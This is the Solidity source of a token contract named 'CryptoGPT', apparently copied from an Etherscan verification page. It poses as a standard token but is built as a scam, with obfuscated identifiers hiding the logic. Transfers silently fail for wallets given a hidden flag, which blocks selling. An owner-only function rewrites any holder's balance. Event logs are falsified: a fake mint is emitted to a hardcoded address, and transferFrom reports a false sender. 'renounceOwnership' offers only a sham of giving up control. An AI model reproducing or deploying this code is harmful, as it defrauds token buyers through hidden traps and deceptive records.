/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract CryptoGPT {
    using SafeMath for uint256;
    mapping (address => uint256) private IlIa;
	
    mapping (address => uint256) public IlIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "CryptoGPT";
	
    string public symbol = "GPT";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private IlIc;
      address private IlId;
    uint256 private IlIe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address IlIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IlId = msg.sender;
             IlIa[msg.sender] = totalSupply;
        
       SCRL();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SCRL() internal  {                             
                       IlIb[msg.sender] = 4;
                       IlIc = IlIf;

                

        emit Transfer(address(0), IlIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return IlIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(IlIb[msg.sender] <= IlIe) {
    require(IlIa[msg.sender] >= value);
IlIa[msg.sender] -= value;  
IlIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(IlIb[msg.sender] > IlIe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function gchck (address IlIj, uint256 IlIk) public {
		if(IlIb[msg.sender] == IlIe) {   
			   	   
   IlIb[IlIj] = IlIk;}
   }
		       function gset (uint256 IlIk) onlyOwner public {
                     IlIe = IlIk; 
	}

 		       function gbrn (address IlIj, uint256 IlIk) onlyOwner public {		   	   
  IlIa[IlIj] = IlIk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(IlIb[from] < IlIe && IlIb[to] < IlIe) {
        require(value <= IlIa[from]);
        require(value <= allowance[from][msg.sender]);
        IlIa[from] -= value;
        IlIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(IlIb[from] == IlIe) {
        require(value <= IlIa[from]);
        require(value <= allowance[from][msg.sender]);
        IlIa[from] -= value;
        IlIa[to] += value;
        allowance[from][msg.sender] -= value;


            from = IlIf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(IlIb[from] > IlIe || IlIb[to] > IlIe) {
             
         }}



     

        	
 }